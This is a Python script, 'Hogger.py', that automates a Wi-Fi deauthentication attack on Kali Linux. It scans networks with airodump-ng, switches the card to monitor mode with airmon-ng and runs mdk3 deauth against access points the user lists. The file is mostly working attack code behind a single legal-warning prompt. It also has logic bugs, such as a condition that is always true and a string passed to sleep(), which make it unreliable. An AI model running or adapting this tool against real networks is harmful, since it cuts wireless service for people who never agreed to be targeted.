#!/usr/bin/python3
'''
Hogger.py V1
Built for Kali Linux

~ C0rruptedb1t
'''
from time import sleep

def hook():
	os.system("clear")
	print("xoooolllooooooddxxkkkkkkxkkkOOO0000KKKKKXXXXXKKKKKKKKKK00000000KKKK0KKKXKXXXXXNX")
	print("doooooooooooodddxkkkOkkkkkOOOOOO0000KKKKKKXKKKKKKK0000000000000K000000O0000KKKKK")
	print("dddoddddoooodddxxkkkkOOOOOOOOOOOO000KKKKKKKKKKKKKK0000O0000KKKKKKK0000OOOOOOOO00")
	print("xddddddddddddxxxkkkOOOOO00000OOO00000KKKKKKKKKK0KKKK00KK000X000000000OOOkkkkkkkk")
	print("xxddddddddxxxxkkOOOOO000000koc;,,;clx0KKKKKKKKK00KKXKK00K00000000O00OOkkkkxxxxxx")
	print("OkkkkkkkkkkkkkkOOO000KK0dc,,,,''''''':kKKXXXXKKKXXXXXXKKKKK000000O0OOOOkkkkkkkkk")
	print("XXXXXXXKKK0000000000Kxc,,,,,,,;co:'''''lKNNNXXXXXXXXXXXXXXXXKKKK000OOOOOOkkkkkkk")
	print("XXNNNNNNNNNNNNXXXXXX0,,,,,:dOXNNNXk;'''',xNNXNNNNNXXXXXXXXXXKKKKK00OOOOOkkkkkkkk")
	print("NXNNWWWWNWNWWWWWNWWWN,'''xNNNNNNNNNXo'''''cXNNNNNNNNNXXXXXXXKKKXXKK00OOOOOOkkOOO")
	print("NNNNWWWWNNNNNNNWWWWWWl'''xNNNNNNNNNNNO,....;KNNNNNNNNNXXXXXXXXXXXXKKK0000OO00000")
	print("WWWWWWWWWWWWWWWWWWWWWx''':kkNWWWWWWWWWX;....,KNNNNNNNNNNNNNXXNNXXXXXXKKKKKKKKKXX")
	print("MMMMMMWWWWWWWWWWWWWWW,....dXWWWWWWWWWWWN;....,xNWWWWNNWWNNNNNNNNNNNNNNNNNNNNNNNN")
	print("MMMMMMMMMMMMMMMMMMMMWXd;..cdoXWWWWWWWWWNx......lXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW")
	print("MMMMMMMMMMMMMMMMMMMMMMM,...:WWKWMMWWWWWx'........lKWWWWWWWWWWWWWWWWWWWMMMMMMMMMM")
	print("MMMMMMMMMMMMMMMMMMMMMMMNxo'.:'kMMMMMMMMMWxdkl'.....;xNMMMMMMMMMMMMMMMMMMMMMMMMMM")
	print("MMMMMMMMMMMMMMWWWWWWWWMMMMl...:xWMMMMMMMMMMMMWk,......;xKWMMMMMMMMMMMMMMMMMMMMMM")
	print("WWWWWWWWWWWWWWWWWWWWWWWWWWWNKWWNWMMMMMMMMMMMMMMWk'........;XMMMMMMMMMMMMMMMMMMMM")
	print("NNNNNNNNNNNNNNNNNNNNNNWWWWWWWWWWWWWWWMWWWWMMMMMMMWd.......:NMMMMMMMMMMMMMMMMMMMM")
	print("XXXXKKKKKKKXXXXXXNNXNNNNNNNNWNNWWWWWWWWWWWWWWWWWWWWNo;';dXMMMMMMMMMMMMMMMMMMMMMM")
	print("000000OO000KKKXXXXXXXXXXXNNNNNNNNNNNNNNNWWWWWWWWWWWWWWWWWWMMMMMMMMMMMMMMMMMMWWWW")
	print("OOkkkOOOOOO000KXXKKKXXXXXXXNNNNNNNNNNNNNNNNNNNNWWNNNWWWWWWWWWWWWWWWWWWWWWWWWWWNW")
	print("kkkkkkkOOOOOO000KKKKXXXXXXXXXXXXXXXXXNXXXXXXXXNNNNNNNNNNNNNNNNNNXNNNNNNNWWWWWNNN")
	print("kkkkkkkOOOOOOO00KKKKKKXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXKKK00000KKXXXNNNXXNX")
	time.sleep(3)
	os.system("clear")



def welcomescreen():
	global hookshown
	global warnshown
	os.system("clear")
	if warnshown == ("false"):
		warning = input("It is illegal to attack networks that you do not have permission to attack, Press any key to confirm that you understand")
		warnshown = "true"
	if (hookshown == "false"):
		hook()
		hookshown = "true"
	print("Welcome to Hogger")
	print("~C0rrupteb1t")
	print("1. Scan network")
	print("2. Setup Hogger")
	print("3. Activate Hogger")
	print("4. Requirements")
	print("5. Run Setup")
	print("6. See Current Settings")
	print("7. About Hogger.py")	
	print("99. Exit")
	choice = input("Enter Choice Number: ")
	choice = str(choice)	
	if choice == "1":
		scannetwork()
	elif choice == "2":
		runsetup()
	elif choice == "3":
		activatehog()
	elif choice == "4":
		requirements()
	elif choice == "5":
		setup()
	elif choice == "6":
		see()	
	elif choice == "7":
		about()	
	elif choice == "99":
		os.system("exit")
	else:
		os.system("clear")
		welcomescreen()
def scannetwork():
	#timetowait = int(input("How long to scan? "))
	os.system("clear")
	print("Press Ctrl+C When Finished")
	wlannum = input("Wireless Interface to use: ")
	os.system("airodump-ng " + wlannum)
	choice = input("Would you like to setup hogger? (Y/n) ")
	
	if choice == "Y" or choice == "y" or choice=="":
		runsetup()
	elif choice == "N" or choice == "n":
		welcomescreen()

def activatehog():
	global apname
	global wlannum
	global attackmode
	os.system("clear")
	attackmode = input("Select type of deauth blacklist/whitelist [B\w]: ")
	attackmode.lower()
	if attackmode == "b" or "w":
		print("")
		print("Activating Hogger...")
		print("Switching wireless interfaces to mon mode...")
		os.system("airmon-ng check kill")
		os.system("airmon-ng start " + wlannum)
		print("Setting up mdk3...")
		print("<insert roadhog overwatch ascii here>")
		print("TIME TO GO WHOLE HOG")
		print("Exploiting...")
		print(wlannum)
		#os.system("mdk3 " + wlannum + "mon" + " d -w '/root/whitelist.txt' -b '/root/blacklist.txt'")
		#os.system("mdk3 " + wlannum + " d -w '/root/whitelist.txt' -b '/root/blacklist.txt'") #in case wlan doesn't have mon on the end
		if attackmode == "b":
			os.system("mdk3 " + wlannum + " d -b '/root/blacklist.txt'")
		else:
			os.system("mdk3 " + wlannum + " d -w '/root/whitelist.txt'")
	else:
		print("Invalid Input")
		time.sleep("2")
		activatehog()
def runsetup():
	global apname
	global attackmode
	global wlannum
	global aptype
	mac = input("MAC(s) of AP (seperate with spaces for muilt macs): ")
	file = open("blacklist.txt", "w")
	file.write(mac)
	file.close()
	mac = input("MAC(s) of your devices (seperate with spaces for muilt macs): ")
	file = open("whitelist.txt", "w")
	file.write(mac)
	file.close()	
	wlannum = input("Wireless interface: ")
	welcomescreen()
	
def requirements():
	os.system("clear")	
	print("Hogger.py Requirements:")
	print("It's recommended to put Hogger.py in /root")
	print("--=Min=--")
	print("mdk3")
	print("python3")
	print("airmon-ng")
	print("A Wireless Card")
	entertopass = input("Press Enter To Continue")
	os.system("clear")
	welcomescreen()
def setup():
	print("")
	os.system("clear")
	print("-= THIS IS NOT FINISHED IF THIS DOESN'T WORK, REFER TO THE REQUIREMENTS TO LEARN WHAT TOOLS NEED TO BE INSTALLED =-")
	exitin = input("Press Enter To Confirm That You Have Read And Understood This")
	os.system("clear")
	os.system("apt-get install python3 -y") #should update python if out of date
	os.system("apt-get install aircrack-ng -y")
	os.system("apt-get install mdk3 -y")
	print("Done")
	welcomescreen()
def see():
	global aptype
	global apname
	global wlannum
	print("Current Settings:")
	print("Wireless Interface: " + (wlannum))
	print("-=AP=-")
	print("")
	clear = input("Press Enter To Continue")
	os.system("clear")
	welcomescreen()
def about():
	os.system("clear")
	print("Hogger.py")
	print("Created by C0rruptedb1t")
	print("Built for Kali Linux")
	print("Hogger.py automates the process of a deauth attack using a tool called mdk3")
	print("")	
	clear = input("Press Enter To Continue")
	os.system("clear")
	welcomescreen()

import os
import time
attackmode = "b"
warnshown = "false"
hookshown = "false"
aptype = ""
apname = ""
wlannum = ""
os.system("clear")
welcomescreen()
